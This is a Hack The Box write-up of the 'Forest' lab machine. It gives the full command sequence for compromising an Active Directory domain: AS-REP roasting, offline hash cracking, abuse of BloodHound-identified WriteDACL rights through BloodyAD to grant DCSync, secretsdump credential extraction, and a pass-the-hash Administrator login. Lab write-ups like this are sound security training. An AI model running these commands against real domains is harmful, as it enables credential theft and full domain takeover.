# Hack The Box Forest — Write-Up

## Overview

**Target:** Forest  
**Domain:** `htb.local`  
**Domain Controller:** `FOREST.htb.local` (`10.129.95.210`)  
**Operating System:** Windows Server 2016 Standard  
**Initial Access:** AS-REP roasting  
**Privilege Escalation:** Abusing delegated Active Directory permissions to obtain DCSync rights  
**Tools:** Nmap, Kerbrute, SMBClient, rpcclient, Impacket, Hashcat, BloodHound.py, BloodyAD, Evil-WinRM

---

The results identified a Windows Server 2016 host named `FOREST`, belonging to the `htb.local` domain. LDAP, Kerberos, SMB, the Global Catalog, and WinRM were accessible.

The most relevant findings were:

- DNS (53), Kerberos (88), LDAP (389), and Global Catalog (3268) were exposed.

```bash
smbclient -N -L '//10.129.95.210/'
```

## 2. Initial Access: AS-REP Roasting

I checked the enumerated usernames for accounts that did not require Kerberos pre-authentication:

```bash
impacket-GetNPUsers htb.local/ -usersfile ./users.list -no-pass
```

The output returned an AS-REP response for `svc-alfresco`. This indicated that the account was configured with the `UF_DONT_REQUIRE_PREAUTH` flag, allowing an attacker to request material that could be attacked offline without first knowing the account's password.

I saved the returned hash and used Hashcat with the `rockyou.txt` wordlist. Hashcat identified the format as mode `18200` (Kerberos 5 AS-REP, etype 23) and successfully cracked it.

### Access over WinRM

With the recovered `svc-alfresco` credentials, I connected to the host using Evil-WinRM:

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p '<password>'
```

I located `user.txt` on the account's Desktop and captured the user flag.

---

## 3. Active Directory Enumeration with BloodHound

After obtaining a shell, I collected Active Directory data with `bloodhound-python`:

```bash
bloodhound-python --username svc-alfresco --password '<password>' \
  -d htb.local -dc FOREST.htb.local -ns 10.129.95.210 -c all
```

The collection retrieved domain, user, group, OU, GPO, and computer information. Some computer-related collection steps produced Kerberos errors, including clock skew, but the tool still collected substantial directory data.

I then examined the BloodHound relationships for `svc-alfresco`.



Two relationships stood out:

1. The account could add itself to **Exchange Windows Permissions**.

![BloodHound showing the service account's outbound privilege relationship](/assets/images/forest_svc_outbound_privelge.png)

2. That group had `WriteDACL` over the domain root object.

![BloodHound showing Exchange Windows Permissions and WriteDACL over the domain](/assets/images/exchange_windows_group_privilege.png)


The domain root was:

```text
DC=HTB,DC=LOCAL
```

This was the pivotal finding. `WriteDACL` does not itself mean “Domain Admin”; it permits modification of an object's discretionary access control list. When the target is the domain root, that ability can be used to grant additional directory permissions—including the replication rights required for DCSync.

---

## 4. Privilege Escalation: Group Membership and DCSync

### Step 1: Add `svc-alfresco` to Exchange Windows Permissions

I used BloodyAD to add the account to the group identified in BloodHound:

```bash
bloodyad -H htb.local --username svc-alfresco --password '<password>' \
  add groupMember 'EXCHANGE WINDOWS PERMISSIONS' svc-alfresco
```

BloodyAD confirmed that the membership change succeeded.

This step relied on the account's effective permissions over group membership. It was not a consequence of AS-REP roasting itself; the two findings formed separate stages of the attack chain.

### Step 2: Grant DCSync rights

With the new group membership, I used BloodyAD to grant DCSync capability to `svc-alfresco`:

```bash
bloodyad -H htb.local --username svc-alfresco --password '<password>' \
  add dcsync 'svc-alfresco'
```

BloodyAD reported:

```text
[+] svc-alfresco is now able to DCSync
```

DCSync abuses Active Directory's directory-replication mechanisms. A principal with the necessary replication extended rights can request directory secret data from a domain controller. The relevant rights include **Replicating Directory Changes** and **Replicating Directory Changes All**.

## 5. Credential Access: DCSync

I then used Impacket's `secretsdump` to request domain credential material:

```bash
impacket-secretsdump htb.local/svc-alfresco:'<password>'@10.129.95.210
```

The output included this warning:

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

However, the tool continued with the DRSUAPI method and successfully returned the `HTB\Administrator` account's NTLM hash.

---

## 6. Administrator Access and Root Flag

With the Administrator NTLM hash, I connected using Evil-WinRM's hash-authentication option:

```bash
evil-winrm -i 10.129.95.210 -u administrator -H '<NTLM-hash>'
```

The login succeeded. I navigated to the Administrator profile's Desktop and retrieved `root.txt`, completing the machine.
